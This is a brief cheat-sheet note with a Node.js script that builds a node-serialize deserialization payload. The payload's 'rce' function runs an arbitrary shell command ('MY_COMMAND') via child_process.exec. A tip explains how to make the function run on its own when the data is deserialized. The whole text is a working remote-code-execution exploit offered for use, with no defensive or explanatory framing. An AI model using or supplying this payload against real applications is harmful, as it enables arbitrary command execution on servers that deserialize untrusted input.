#deserialization #nodejs 

```node
var serialize = require('node-serialize');

var y = {
  rce : function(){
    require('child_process').exec('MY_COMMAND', function(error, stdout, stderr) { console.log(stdout) });
  }
}
console.log(serialize.serialize(y));
```

Remember: Add `()` after the second `}` at the end of the payload for the function to be called.